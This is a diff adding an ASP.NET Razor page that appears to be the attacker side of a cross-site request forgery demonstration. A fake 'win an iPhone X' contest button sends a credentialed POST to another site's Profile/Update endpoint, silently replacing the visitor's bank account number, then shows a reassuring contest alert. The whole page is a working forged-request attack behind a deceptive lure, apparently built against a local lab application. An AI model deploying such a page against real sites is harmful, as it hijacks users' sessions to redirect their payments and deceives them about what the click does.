@@ -1,0 +1,28 @@
+﻿@{
+    ViewData["Title"] = "Home Page";
+}
+
+<h1>Want to win an iPhone X?</h1>
+
+<h2>Your brand new iPhone X is just one click away!</h2>
+
+<input type="button" value="Win an iPhone!" onclick="submitEvilForm()" />
+
+<script>
+    var submitEvilForm = function() {
+        $.ajax({
+            url: "http://web.local:57082/Profile/Update",
+            type: "POST",
+            contentType: "application/json",
+            data: JSON.stringify({
+                bankAccount: '999999999999'
+            }),
+            xhrFields: {
+                withCredentials: true
+            }
+        }).done(function (data) {
+            console.log(data);
+        });
+        alert("Thanks for entering the contest! Good luck!");
+    };
+</script>
